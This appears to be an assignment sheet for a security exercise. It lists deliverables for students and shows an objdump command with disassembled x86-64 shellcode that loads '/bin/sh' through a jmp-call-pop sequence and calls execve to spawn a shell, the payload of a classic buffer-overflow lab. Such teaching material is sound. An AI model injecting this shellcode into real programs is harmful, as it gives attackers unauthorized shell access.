# Deliverables
 
1. Scripts containing the commands or other building blocks you used to pull off the attack.
1. A file of notes that tells me what you had to learn to understand the tutorial (it will just be a list of places you got confused, and how you resolved the confusion).
1. Everyone should be prepared to answer questions.



## The shell game

`objdump -d a.out | sed -n '/needle0/,/needle1/p'`

00000000004004b8 <needle0>:
  4004b8:       eb 0e                   jmp    4004c8 <there>

00000000004004ba <here>:
  4004ba:       5f                      pop    %rdi
  4004bb:       48 31 c0                xor    %rax,%rax
  4004be:       b0 3b                   mov    $0x3b,%al
  4004c0:       48 31 f6                xor    %rsi,%rsi
  4004c3:       48 31 d2                xor    %rdx,%rdx
  4004c6:       0f 05                   syscall

00000000004004c8 <there>:
  4004c8:       e8 ed ff ff ff          callq  4004ba <here>
  4004cd:       2f                      (bad)
  4004ce:       62                      (bad)
  4004cf:       69 6e 2f 73 68 00 ef    imul   $0xef006873,0x2f(%rsi),%ebp

00000000004004d5 <needle1>:


